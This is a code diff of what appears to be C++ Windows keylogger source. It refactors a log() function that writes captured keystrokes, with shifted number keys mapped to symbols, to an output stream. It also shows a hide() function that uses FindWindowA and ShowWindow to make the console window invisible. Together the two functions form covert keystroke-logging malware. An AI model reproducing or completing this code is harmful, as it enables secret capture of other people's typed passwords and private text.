@@ -54,70 +54,31 @@ void log()
 					{
 						switch(c)
 						{
-							case 49:
-							{
-								write << "!";
-							}
+							case 49: write << "!";
 							break;
-							case 50:
-							{
-								write << "@";
-							}
+							case 50: write << "@";
 							break;
-							case 51:
-							{
-								write << "#";
-							}
+							case 51: write << "#";
 							break;
-							case 52:
-							{
-								write << "$";
-							}
+							case 52: write << "$";
 							break;
-							case 53:
-							{
-								write << "%";
-							}
+							case 53: write << "%";
 							break;
-							case 54:
-							{
-								write << "^";
-							}
+							case 54: write << "^";
 							break;
-							case 55:
-							{
-								write << "&";
-							}
+							case 55: write << "&";
 							break;
-							case 56:
-							{
-								write << "*";
-							}
+							case 56: write << "*";
 							break;
-							case 57:
-							{
-								write << "(";
-							}
+							case 57: write << "(";
 							break;
-							case 48:
-							{
-								write << ")";
-							}
+							case 48: write << ")";
 							break;
-							case 45:
-							{
-								write << "_";
-							}
+							case 45: write << "_";
 							break;
-							case 61:
-							{
-								write << "+";
-							}
+							case 61: write << "+";
 							break;
-							case 47:
-							{
-								write << "?";
-							}
+							case 47: write << "?";
 							break;
 							default: write << c;
 						}
@@ -168,8 +129,7 @@ void hide()
 	stealth = FindWindowA("ConsoleWindowClass", NULL);
 	ShowWindow(stealth, 0);
 }
-/*  TESTING SPACE
- *
+/*  Junk Space
  * {
 								write << " ! ";
 								}
